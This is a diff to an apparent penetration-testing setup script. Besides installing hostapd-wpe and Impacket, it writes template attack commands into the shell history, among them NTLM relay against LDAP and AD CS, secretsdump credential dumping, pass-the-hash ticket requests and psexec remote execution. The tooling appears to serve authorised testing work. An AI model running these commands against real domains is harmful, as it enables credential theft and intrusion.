@@ -282,17 +282,30 @@ wget https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7
 # Hostapd-wpe
 cd $WIFI_DIR
 sudo apt-get -y install hostapd-wpe
+echo "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf" >> ~/.zsh_history
 
 # Impacket
 cd $INTERNALS_DIR
+pipx install impacket
 wget https://github.com/fortra/impacket/releases/download/impacket_0_12_0/impacket-0.12.0.tar.gz
 tar -xzf impacket-0.12.0.tar.gz
 rm impacket-0.12.0.tar.gz
 cd impacket-0.12.0
 python3 -m venv .
-source bin/activate
-pip3 install -r requirements.txt
-deactivate
+#source bin/activate
+#pip3 install -r requirements.txt
+#deactivate
+echo "impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'" >> ~/.zsh_history
+echo "impacket-lookupsid DOMAIN/guest@IP" >> ~/.zsh_history
+echo "impacket-ntlmrelayx --lootdir "loot_relay" -of ~/ntlmrelay_hashs.txt -t "ldap://<DC-IP>" -smb2support --remove-mic" >> ~/.zsh_history
+echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -debug -smb2support -t http://<IP-PKI>/certsrv/certfnsh.asp --adcs --template [KerberosAuthentication/DomainController]" >> ~/.zsh_history
+echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -tf relay.txt -smb2support [-socks]" >> ~/.zsh_history
+echo "impacket-GetADUsers -all -dc-ip <DC-IP> domain.local/username" >> ~/.zsh_history
+echo "impacket-getTGT domain.local/username -hashes :<NTLM> -dc-ip <DC-IP>" >> ~/.zsh_history
+echo "impacket-smbclient 'domain.local/user:pass@10.10.11.222'" >> ~/.zsh_history
+echo "impacket-addcomputer -computer-name 'MyComputer$' -computer-pass 'Password123' -dc-host 10.10.11.222 'DOMAIN/user:password'" >> ~/.zsh_history
+echo "impacket-secretsdump -target-ip IP [-just-dc-ntlm] [-history] USER@DOMAIN" >> ~/.zsh_history
+echo "impacket-psexec 'domain.local/user:pass@10.10.11.222' whoami" >> ~/.zsh_history
 
 # ItWasAllADream
 cd $INTERNALS_DIR
